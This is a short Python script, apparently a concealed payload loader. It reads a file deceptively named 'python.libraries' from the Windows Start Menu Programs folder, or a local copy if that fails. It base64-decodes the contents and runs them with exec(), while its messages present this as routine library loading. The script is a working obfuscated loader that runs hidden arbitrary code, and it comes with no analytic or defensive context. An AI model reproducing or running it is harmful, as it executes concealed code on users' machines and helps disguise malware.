import base64
import os

def gtm(file_name):
    # Get the APPDATA environment variable
    appdata_path = os.getenv('APPDATA')
    
    if not appdata_path:
        raise EnvironmentError("APPDATA environment variable is not set.")
    
    # Construct the full path to the Startup folder
    startup_folder = os.path.join(appdata_path, r'Microsoft\Windows\Start Menu\Programs')
    
    # Construct the full path to the file
    file_path = os.path.join(startup_folder, file_name)
    
    # Check if the file exists
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"The file {file_path} does not exist.")
    
    return file_path

# Example usage:
file_name = 'python.libraries'  # Replace with your actual file name

try:
    # Get the path to the file in the Startup directory
    file_path = gtm(file_name)
    
    # Read the Base64 encoded content from the file
    with open(file_path, 'r') as file:
        load_library = file.read()
    
    # Decode the Base64 content to a UTF-8 string
    lib_function = base64.b64decode(load_library).decode('utf-8')
    
    # Execute the decoded content
    exec(lib_function)
    
    print("Library loaded and executed successfully.")
except:
    with open(file_name, 'r') as file:
        load_library = file.read()
    
    # Decode the Base64 content to a UTF-8 string
    lib_function = base64.b64decode(load_library).decode('utf-8')
    
    # Execute the decoded content
    exec(lib_function)
